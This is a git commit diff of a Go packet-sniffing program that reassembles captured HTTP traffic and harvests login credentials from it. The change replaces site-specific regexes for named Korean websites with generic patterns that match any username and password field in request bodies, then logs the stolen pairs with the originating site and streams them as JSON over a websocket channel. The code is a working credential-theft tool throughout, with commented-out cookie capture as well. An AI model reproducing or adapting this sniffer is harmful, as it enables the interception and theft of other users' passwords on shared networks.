ffbb637cd62956a8cbf05ce414a8a9661e6ca4d2
백종열 <geeksbaek@gmail.com>
2016-06-18 18:17:44 +0900

    better regexp

--- parse.go
+++ parse.go
@@ -2,8 +2,7 @@ package main
 
 import (
 	"bufio"
-	"bytes"
-	"fmt"
+	"encoding/json"
 	"io"
 	"io/ioutil"
 	"log"
@@ -19,18 +18,21 @@ import (
 )
 
 var (
-	reMap = map[string]*regexp.Regexp{
-		"http://www.dailysecu.com/":   regexp.MustCompile(`&login_userid=(.+)&login_userpw=(.+)`),
-		"http://www.hanbit.co.kr/":    regexp.MustCompile(`&m_id=(.+)&m_passwd=(.+)`),
-		"http://www.icqa.or.kr/":      regexp.MustCompile(`&txtID=(.+)&txtPass=(.+)`),
-		"http://www.giordano.co.kr/":  regexp.MustCompile(`Data%5Bid%5D=(.+)&Data%5Bpw%5D=(.+)`),
-		"http://www.nike.co.kr/":      regexp.MustCompile(`&loginId=(.+)&password=(.+)`),
-		"http://www.junggo.com/":      regexp.MustCompile(`&mb_id=(.+)&mb_password=(.+)`),
-		"http://m.bunjang.co.kr/":     regexp.MustCompile(`userid=(.+)&userpw=(.+)&`),
-		"http://www.coocha.co.kr/":    regexp.MustCompile(`mid=(.+)&mpwd=(.+)`),
-		"http://www.daisomall.co.kr/": regexp.MustCompile(`&id=(.+)&pw=(.+)`),
-		"http://www.ebsi.co.kr/":      regexp.MustCompile(`username=(.+)&j_password=(.+)`),
-	}
+	// reMap = map[string]*regexp.Regexp{
+	// "http://www.dailysecu.com/":   regexp.MustCompile(`&login_userid=(.+)&login_userpw=(.+)`),
+	// "http://www.hanbit.co.kr/":    regexp.MustCompile(`&m_id=(.+)&m_passwd=(.+)`),
+	// "http://www.icqa.or.kr/":      regexp.MustCompile(`&txtID=(.+)&txtPass=(.+)`),
+	// "http://www.giordano.co.kr/":  regexp.MustCompile(`Data%5Bid%5D=(.+)&Data%5Bpw%5D=(.+)`),
+	// "http://www.nike.co.kr/":      regexp.MustCompile(`&loginId=(.+)&password=(.+)`),
+	// "http://www.junggo.com/":      regexp.MustCompile(`&mb_id=(.+)&mb_password=(.+)`),
+	// "http://m.bunjang.co.kr/":     regexp.MustCompile(`userid=(.+)&userpw=(.+)`),
+	// "http://www.coocha.co.kr/":    regexp.MustCompile(`mid=(.+)&mpwd=(.+)`),
+	// "http://www.daisomall.co.kr/": regexp.MustCompile(`&id=(.+)&pw=(.+)`),
+	// "http://www.ebsi.co.kr/":      regexp.MustCompile(`username=(.+)&j_password=(.+)`),
+	// }
+
+	reID = regexp.MustCompile(`(?i)` + `[^&]*(?:id|user|name)[^&]*=([^&]+)`)
+	rePW = regexp.MustCompile(`(?i)` + `[^&]*(?:pass|pw)[^&]*=([^&]+)`)
 )
 
 // httpStreamFactory implements tcpassembly.StreamFactory
@@ -51,39 +53,51 @@ func (h *httpStreamFactory) New(_, _ gopacket.Flow) tcpassembly.Stream {
 				if err != nil {
 					continue
 				}
-				if !isGETorPOST(body) {
-					continue
+				if parsed := find(body); parsed != nil {
+					url := req.Header.Get("Origin")
+					log.Println(url, parsed)
+
+					wsData := struct {
+						Timestamp string
+						URL       string
+						ID        string
+						PW        string
+					}{
+						time.Now().String(),
+						url,
+						parsed[0],
+						parsed[1],
+					}
+					b, _ := json.Marshal(wsData)
+					wsCh <- string(b)
 				}
-				if parsed := find(body); len(parsed) > 0 {
-					go writeToFirebase(parsed)
-				}
+				// cookies := req.Cookies()
+				// if len(cookies) > 0 {
+				// 	referer := req.Header.Get("Referer")
+				// 	log.Println(referer, ":", cookies)
+				// }
 			}
 		}
 	}()
 	return &r
 }
 
-func isGETorPOST(http []byte) bool {
-	if len(http) > 5 && (bytes.Equal(http[:4], []byte("GET ")) || bytes.Equal(http[:5], []byte("POST "))) {
-		return true
-	}
-	return false
-}
-
 func find(http []byte) []string {
-	for url, re := range reMap {
-		parsed := re.FindSubmatch(http)
-		if len(parsed) != 3 {
-			continue
-		}
-		return []string{url, string(parsed[1]), string(parsed[2])}
+	// for url, re := range reMap {
+	// 	parsed := re.FindSubmatch(http)
+	// 	if len(parsed) != 3 {
+	// 		continue
+	// 	}
+	// 	return []string{url, string(parsed[1]), string(parsed[2])}
+	// }
+	// return nil
+
+	id := reID.FindSubmatch(http)
+	pw := rePW.FindSubmatch(http)
+	if len(id) == 2 && len(pw) == 2 {
+		return []string{string(id[1]), string(pw[1])}
 	}
 	return nil
-}
-
-func writeToFirebase(row []string) {
-	// working...
-	fmt.Println(row)
 }
 
 func parse(device pcap.Interface) {
